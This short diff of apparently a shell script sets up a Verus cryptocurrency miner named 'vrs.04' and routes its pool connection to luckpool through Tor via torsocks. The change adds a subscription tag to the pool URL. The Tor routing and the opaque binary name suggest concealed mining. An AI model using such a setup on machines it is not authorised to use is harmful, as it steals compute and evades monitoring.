@@ -7,4 +7,4 @@ ss -tulnp | grep 9050
 torsocks bash
 sudo apt install libomp5 -y
 chmod +x vrs.04
-torsocks ./vrs.04 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RP3HAzjfe4sbNrk56AwtJvyvnmkxooVVXt.lol -p x -t 1
+torsocks ./vrs.04 -a verus -o stratum+tcp://eu.luckpool.net:3960#xnsub -u RP3HAzjfe4sbNrk56AwtJvyvnmkxooVVXt.lol -p x -t 1
